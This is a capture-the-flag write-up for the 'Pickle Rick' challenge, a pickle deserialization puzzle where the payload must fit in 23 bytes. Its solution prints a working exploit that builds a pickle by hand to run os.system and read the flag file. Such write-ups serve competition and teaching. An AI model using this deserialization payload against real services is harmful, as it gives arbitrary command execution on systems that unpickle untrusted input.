# Pickle Rick
**Category:** misc

**Author:** _Rok0'sBasilisk_

## Description
It's Pickle Riiiick! Morty \*burp\* look at me! Not only am I a pickle, I can play golf at the same time!

## Solution
<details>
 <summary>Reveal Spoiler</summary>

The first step is to inspect the code of the challenge using the `!code` command. Through code review it is obvious that this is a pickle deserialization challenge, however there is a single requirements to get a working exploit. The pickled payload must be maximum 23 bytes.

This is a classic golf challenge with the aim of making the pickled payload as compact as possible. 

It is critical that particiapts craft the pickled object manually rather than relying on the `pickle` library, so that unnecessary bytes are avoided.

Here is a working exploit:
```
import base64

from pickle import PROTO, SHORT_BINUNICODE, GLOBAL, TUPLE1, REDUCE, STOP

golf_payload = \
    PROTO + b"\x04" + \
    GLOBAL + b"os\nsystem\n" + \
    SHORT_BINUNICODE + b"\x05" + b". /f*" + \
    TUPLE1 + \
    REDUCE + \
    STOP

print(base64.b64encode(golf_payload).decode("utf-8"))
```

Note that you need to use `ls` initially, to realise that the flag is in the root dir.
</details>